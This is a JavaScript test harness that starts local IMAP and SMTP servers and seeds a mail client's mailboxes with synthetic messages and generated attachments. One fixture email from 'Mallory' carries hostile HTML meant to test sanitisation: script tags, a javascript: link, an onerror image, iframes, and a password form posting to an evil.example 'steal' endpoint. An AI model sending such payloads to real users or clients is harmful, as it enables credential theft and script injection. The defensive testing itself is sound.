// Aurora Mail end-to-end tests: a local IMAP server (hoodiecrow-imap, in this process) and a local
// SMTP server (smtp-server) seeded with ~65 messages, driven through the real shell.
//   xvfb-run -a -s "-screen 0 1600x900x24" node test/mail.test.mjs [--only=name,name] [--keep] [--server]
// The two test-only packages are NOT shell dependencies: they are installed once into
// $MAILTEST_DIR (default /tmp/claude-0/mailtest, or <tmp>/aurora-mailtest) with `npm i smtp-server hoodiecrow-imap`.
// --server only starts the servers (prints ports) for manual testing.
// Screenshots: test/out/mail-*.png; the reference ones are copied to docs/screenshots/.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { execFileSync } from 'node:child_process';
import { createRequire } from 'node:module';
import { fileURLToPath, pathToFileURL } from 'node:url';

const require = createRequire(import.meta.url);
const here = path.dirname(fileURLToPath(import.meta.url));
const DOCS_SHOTS = path.join(here, '..', '..', 'docs', 'screenshots');

export const USER = 'alice@aurora.test';
export const PASS = 'Aurora-Test-1';

// ------------------------------------------------------------------ test-only dependencies
function testDeps() {
  const candidates = [process.env.MAILTEST_DIR, '/tmp/claude-0/mailtest', path.join(os.tmpdir(), 'aurora-mailtest')].filter(Boolean);
  for (const dir of candidates) {
    if (fs.existsSync(path.join(dir, 'node_modules', 'hoodiecrow-imap')) && fs.existsSync(path.join(dir, 'node_modules', 'smtp-server'))) return dir;
  }
  const dir = candidates[0];
  fs.mkdirSync(dir, { recursive: true });
  console.log(`[mailtest] installing smtp-server + hoodiecrow-imap into ${dir}`);
  if (!fs.existsSync(path.join(dir, 'package.json'))) fs.writeFileSync(path.join(dir, 'package.json'), '{"name":"aurora-mailtest","private":true}');
  execFileSync('npm', ['i', '--no-audit', '--no-fund', 'smtp-server', 'hoodiecrow-imap'], { cwd: dir, stdio: 'inherit' });
  return dir;
}

// ------------------------------------------------------------------ fixtures
function crc32(buf) {
  let c;
  const table = (crc32.t ||= Array.from({ length: 256 }, (_, n) => {
    c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    return c >>> 0;
  }));
  let crc = 0xffffffff;
  for (const b of buf) crc = table[(crc ^ b) & 0xff] ^ (crc >>> 8);
  return (crc ^ 0xffffffff) >>> 0;
}

// A small gradient PNG (no image library needed).
export function png(w = 96, h = 64, [r1, g1, b1] = [40, 110, 240], [r2, g2, b2] = [120, 220, 200]) {
  const raw = Buffer.alloc((w * 3 + 1) * h);
  for (let y = 0; y < h; y++) {
    raw[y * (w * 3 + 1)] = 0;
    for (let x = 0; x < w; x++) {
      const t = (x + y) / (w + h);
      const o = y * (w * 3 + 1) + 1 + x * 3;
      raw[o] = Math.round(r1 + (r2 - r1) * t);
      raw[o + 1] = Math.round(g1 + (g2 - g1) * t);
      raw[o + 2] = Math.round(b1 + (b2 - b1) * t);
    }
  }
  const chunk = (type, data) => {
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length);
    const td = Buffer.concat([Buffer.from(type), data]);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crc32(td));
    return Buffer.concat([len, td, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0);
  ihdr.writeUInt32BE(h, 4);
  ihdr[8] = 8;
  ihdr[9] = 2;
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk('IHDR', ihdr), chunk('IDAT', zlib.deflateSync(raw)), chunk('IEND', Buffer.alloc(0))]);
}

function pdf(text = 'Aurora quarterly report') {
  const objs = [
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>',
    null,
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
  ];
  const stream = `BT /F1 24 Tf 72 700 Td (${text}) Tj ET`;
  objs[3] = `<< /Length ${stream.length} >>\nstream\n${stream}\nendstream`;
  let out = '%PDF-1.4\n';
  const offs = [];
  objs.forEach((o, i) => {
    offs.push(out.length);
    out += `${i + 1} 0 obj\n${o}\nendobj\n`;
  });
  const xref = out.length;
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offs.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}`;
  out += `trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(out, 'latin1');
}

const MailComposer = (() => {
  const m = require('nodemailer/lib/mail-composer');
  return m.default || m;
})();
export function build(mail) {
  const node = new MailComposer({ headers: { 'X-Mailer': 'Aurora test fixtures' }, ...mail }).compile();
  node.keepBcc = true;
  return new Promise((resolve, reject) => node.build((e, b) => (e ? reject(e) : resolve(b.toString('binary')))));
}

const SENDERS = [
  ['Contoso Weekly', 'news@contoso.example'],
  ['Marc Dupont', 'marc@dupont.example'],
  ['Sophie Martin', 'sophie@martin.example'],
  ['Élodie Fournier', 'elodie@exemple.fr'],
  ['Ravi Patel', 'ravi@fabrikam.example'],
  ['GitHub', 'noreply@github.example'],
  ['Northwind Bank', 'alerts@northwind.example'],
  ['Lucas Bernard', 'lucas.bernard@exemple.fr'],
  ['Mia Chen', 'mia.chen@adatum.example'],
  ['Travel Desk', 'travel@tailspin.example'],
];
const TOPICS = [
  ['Build #{n} passed', 'All checks passed on main. 1 284 tests, 0 failures. Artifacts are ready for download.'],
  ['Your statement is ready', 'Your monthly statement for account ending 4821 is available in online banking.'],
  ['Lunch on Thursday?', 'Are you free for lunch on Thursday? There is a new place near the office.'],
  ['Weekly sync notes', 'Action items: update the roadmap, review the design specs, book the meeting room.'],
  ['Flight confirmation XK{n}', 'Your flight is confirmed. Check-in opens 24 hours before departure.'],
  ['Code review requested', 'You have been asked to review a change in aurora-shell: "Improve window snapping".'],
  ['Photos from the weekend', 'Here are a few photos from the weekend. The weather was great!'],
  ['Invoice {n}', 'Please find the details of invoice {n} in your customer area.'],
];

export async function seed() {
  const now = Date.now();
  const H = 3600 * 1000;
  const D = 24 * H;
  const at = (ms) => new Date(now - ms);
  const inbox = [];
  const add = async (box, mail, { flags = [], ago = H } = {}) => {
    const date = at(ago);
    box.push({ raw: await build({ date, to: `Alice Martin <${USER}>`, ...mail }), flags, internaldate: date });
  };
  // Filler first (oldest), so the interesting messages are on the first page.
  for (let i = 0; i < 48; i++) {
    const [name, address] = SENDERS[(i * 3) % SENDERS.length];
    const [subject, body] = TOPICS[i % TOPICS.length];
    const n = 1000 + i;
    await add(inbox, { from: { name, address }, subject: subject.replace('{n}', n), text: `Hi Alice,\n\n${body.replaceAll('{n}', n)}\n\nBest regards,\n${name}` }, { flags: ['\\Seen'], ago: (6 + i * 1.7) * D });
  }
  await add(
    inbox,
    {
      from: { name: 'Ravi Patel', address: 'ravi@fabrikam.example' },
      cc: [{ name: 'Mia Chen', address: 'mia.chen@adatum.example' }, 'lucas.bernard@exemple.fr'],
      subject: 'Re: Projet Aurora — planning',
      inReplyTo: '<thread-2@fabrikam.example>',
      references: ['<thread-1@aurora.test>', '<thread-2@fabrikam.example>'],
      text: 'Sounds good to me. Let us freeze the scope on Friday.\n\nRavi\n\nOn Tue, Mia Chen wrote:\n> I updated the planning with the new milestones.\n> The beta is now planned for next month.\n>\n>> On Mon, Alice Martin wrote:\n>> Can everyone review the planning before Friday?\n',
    },
    { flags: ['\\Seen', '\\Answered'], ago: 3 * D },
  );
  await add(
    inbox,
    {
      from: { name: 'Mallory', address: 'mallory@evil.example' },
      subject: 'Security test message',
      html: `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/refresh"><script>window.top.postMessage('pwned','*')</script><link rel="stylesheet" href="https://evil.example/style.css"><base href="https://evil.example/"></head>
<body><h2 id="safe-heading">Totally safe content</h2><p>Click <a id="js-link" href="javascript:alert(1)">here</a> or <a id="web-link" href="https://www.example.com/page">a normal link</a>.</p>
<img id="onerror-img" src="x" onerror="alert(1)"><iframe src="https://evil.example/frame"></iframe><form action="https://evil.example/steal"><input name="password"><button>Go</button></form>
<object data="https://evil.example/x.swf"></object><svg><script>alert(2)</script></svg><div style="background:url(https://evil.example/bg.png)">Background</div></body></html>`,
      text: 'Totally safe content',
    },
    { flags: [], ago: 2.5 * D },
  );
  await add(
    inbox,
    {
      from: { name: 'Élodie Fournier', address: 'elodie@exemple.fr' },
      subject: "Réunion d'équipe — compte rendu",
      text: "Bonjour à tous,\n\nVoici le compte rendu de la réunion d'équipe de mardi :\n\n• Les déploiements se feront désormais le jeudi.\n• L'équipe « Interface » présentera la maquette à la fin du mois.\n• Prochaine réunion : lundi 14 h 30, salle Hélène-Boucher.\n\nN'hésitez pas à me répondre si j'ai oublié quelque chose.\n\nÉlodie\nhttps://intranet.exemple.fr/reunions",
    },
    { flags: ['\\Flagged'], ago: 2 * D },
  );
  await add(
    inbox,
    {
      from: { name: 'Lucas Bernard', address: 'lucas.bernard@exemple.fr' },
      subject: 'Contact et liens',
      html: '<p>Bonjour Alice,</p><p>Écris-moi à <a id="mailto-link" href="mailto:lucas.bernard@exemple.fr?subject=Bonjour%20Lucas">lucas.bernard@exemple.fr</a> ou consulte <a href="https://www.example.com/agenda">l\'agenda</a>.</p><p>Lucas</p>',
      text: 'Bonjour Alice, écris-moi à lucas.bernard@exemple.fr',
    },
    { flags: ['\\Seen'], ago: 1.6 * D },
  );
  await add(
    inbox,
    {
      from: { name: 'Sophie Martin', address: 'sophie@martin.example' },
      subject: 'Photo from the trip',
      html: '<p>Hi Alice!</p><p>Here is the view from the hotel:</p><p><img id="inline-photo" src="cid:photo1@aurora.test" width="192" height="128" alt="View"></p><p>See you soon,<br>Sophie</p>',
      text: 'Hi Alice! Here is the view from the hotel. See you soon, Sophie',
      attachments: [{ filename: 'view.png', content: png(192, 128, [250, 150, 60], [90, 60, 200]), cid: 'photo1@aurora.test', contentType: 'image/png' }],
    },
    { flags: ['\\Seen'], ago: 1.1 * D },
  );
  await add(
    inbox,
    {
      from: { name: 'Marc Dupont', address: 'marc@dupont.example' },
      subject: 'Quarterly report (PDF + spreadsheet)',
      text: 'Hello Alice,\n\nPlease find attached the quarterly report and the raw data.\n\nMarc',
      attachments: [
        { filename: 'Quarterly report.pdf', content: pdf(), contentType: 'application/pdf' },
        { filename: 'data.csv', content: 'month,revenue\nJanuary,1200\nFebruary,1350\nMarch,1610\n', contentType: 'text/csv' },
        { filename: 'chart.png', content: png(120, 80), contentType: 'image/png' },
      ],
    },
    { flags: [], ago: 20 * H },
  );
  await add(
    inbox,
    {
      from: { name: 'Contoso Weekly', address: 'news@contoso.example' },
      subject: 'Your weekly digest: 5 stories you might have missed',
      html: `<!doctype html><html><head><style>.wrap{max-width:560px;margin:0 auto;font-family:Arial,sans-serif;color:#222}.hero{width:100%;border-radius:8px}h1{color:#0f6cbd}.btn{display:inline-block;background:#0f6cbd;color:#fff;padding:10px 18px;border-radius:4px;text-decoration:none}</style></head>
<body><div class="wrap"><img id="hero" class="hero" src="https://images.contoso.example/hero.png" alt="Weekly digest"><h1>This week at Contoso</h1>
<p>Five stories you might have missed, hand-picked by our editors.</p><ol><li>New offices open in Lyon</li><li>Product roadmap for the next quarter</li><li>Meet the team behind the redesign</li><li>Tips for remote collaboration</li><li>Community highlights</li></ol>
<p><a class="btn" href="https://www.contoso.example/digest">Read the digest</a></p><img src="https://track.contoso.example/open.gif?u=alice" width="1" height="1" alt=""></div></body></html>`,
      text: 'This week at Contoso — five stories you might have missed.',
    },
    { flags: [], ago: 2 * H },
  );
  await add(
    inbox,
    {
      from: { name: 'Aurora Team', address: 'team@aurora.test' },
      subject: 'Welcome to Aurora Mail',
      text: 'Hi Alice,\n\nWelcome to Aurora Mail! Your account is ready.\n\nTips:\n- Press Ctrl+N to write a new message.\n- Flag important messages to find them quickly.\n\nLearn more at https://aurora.example/docs/mail\n\nThe Aurora team',
    },
    { flags: [], ago: 0.5 * H },
  );

  const sent = [];
  await add(sent, { from: { name: 'Alice Martin', address: USER }, to: 'Ravi Patel <ravi@fabrikam.example>', subject: 'Projet Aurora — planning', text: 'Can everyone review the planning before Friday?' }, { flags: ['\\Seen'], ago: 4 * D });
  await add(sent, { from: { name: 'Alice Martin', address: USER }, to: 'mia.chen@adatum.example', subject: 'Design review', text: 'The new mockups look great.' }, { flags: ['\\Seen'], ago: 5 * D });
  const drafts = [];
  await add(drafts, { from: { name: 'Alice Martin', address: USER }, to: 'sophie@martin.example', subject: 'Trip plans (draft)', html: '<p>Hi Sophie, about the trip…</p>', text: 'Hi Sophie, about the trip…' }, { flags: ['\\Seen', '\\Draft'], ago: 6 * H });
  const archive = [];
  await add(archive, { from: { name: 'Travel Desk', address: 'travel@tailspin.example' }, subject: 'Hotel booking confirmed', text: 'Your hotel booking is confirmed.' }, { flags: ['\\Seen'], ago: 30 * D });
  const junk = [];
  await add(junk, { from: { name: 'Prize Center', address: 'win@spam.example' }, subject: 'You have won!!!', text: 'Claim your prize now.' }, { flags: [], ago: 3 * H });
  const trash = [];
  await add(trash, { from: { name: 'Old Newsletter', address: 'old@news.example' }, subject: 'Old news', text: 'Nothing to see.' }, { flags: ['\\Seen'], ago: 9 * D });
  const projects = [];
  await add(projects, { from: { name: 'Mia Chen', address: 'mia.chen@adatum.example' }, subject: 'Aurora milestones', text: 'Milestone 1: alpha. Milestone 2: beta.' }, { flags: [], ago: 8 * D });

  return {
    INBOX: { messages: inbox },
    '': {
      separator: '/',
      folders: {
        Sent: { 'special-use': '\\Sent', messages: sent },
        Drafts: { 'special-use': '\\Drafts', messages: drafts },
        Archive: { 'special-use': '\\Archive', messages: archive },
        Junk: { 'special-use': '\\Junk', messages: junk },
        Trash: { 'special-use': '\\Trash', messages: trash },
        Projects: { folders: { Aurora: { messages: projects } } },
      },
    },
  };
}

// ------------------------------------------------------------------ servers
export async function startMailServer({ tlsImap = false } = {}) {
  const dir = testDeps();
  const req = createRequire(path.join(dir, 'package.json'));
  const hoodiecrow = req('hoodiecrow-imap');
  const { SMTPServer } = req('smtp-server');
  const storage = await seed();
  const imap = hoodiecrow({
    plugins: ['ID', 'IDLE', 'ENABLE', 'NAMESPACE', 'SPECIAL-USE', 'UNSELECT', 'UIDPLUS', 'MOVE', 'LIST-STATUS', 'LITERALPLUS', 'ESEARCH'],
    users: { [USER]: { password: PASS } },
    storage,
    secureConnection: tlsImap,
  });
  await new Promise((r) => imap.listen(0, '127.0.0.1', r));
  const captured = [];
  const smtp = new SMTPServer({
    secure: false,
    disabledCommands: ['STARTTLS'],
    authOptional: false,
    allowInsecureAuth: true,
    logger: false,
    onAuth(auth, session, cb) {
      if (auth.username === USER && auth.password === PASS) return cb(null, { user: auth.username });
      const e = new Error('Invalid username or password');
      e.responseCode = 535;
      return cb(e);
    },
    onData(stream, session, cb) {
      const chunks = [];
      stream.on('data', (c) => chunks.push(c));
      stream.on('end', () => {
        const raw = Buffer.concat(chunks).toString('binary');
        const rcpt = session.envelope.rcptTo.map((r) => r.address);
        captured.push({ from: session.envelope.mailFrom?.address, rcpt, raw });
        if (rcpt.includes(USER)) imap.appendMessage('INBOX', [], false, raw);
        cb();
      });
    },
  });
  await new Promise((r) => smtp.listen(0, '127.0.0.1', r));
  const imapPort = imap.server.address().port;
  const smtpPort = smtp.server.address().port;
  return {
    imap,
    smtp,
    imapPort,
    smtpPort,
    captured,
    box: (name) => imap.getMailbox(name),
    deliver: (raw, flags = []) => imap.appendMessage('INBOX', flags, false, raw),
    async close() {
      await new Promise((r) => smtp.close(r));
      await new Promise((r) => imap.close(r));
    },
  };
}

const isMain = process.argv[1] && pathToFileURL(path.resolve(process.argv[1])).href === import.meta.url;
if (isMain && process.argv.includes('--server')) {
  const s = await startMailServer();
  console.log(`IMAP 127.0.0.1:${s.imapPort}  SMTP 127.0.0.1:${s.smtpPort}  user ${USER} / ${PASS}`);
} else if (isMain) {
  const { runTests } = await import('./mail.e2e.mjs').catch(() => ({}));
  if (runTests) await runTests();
}
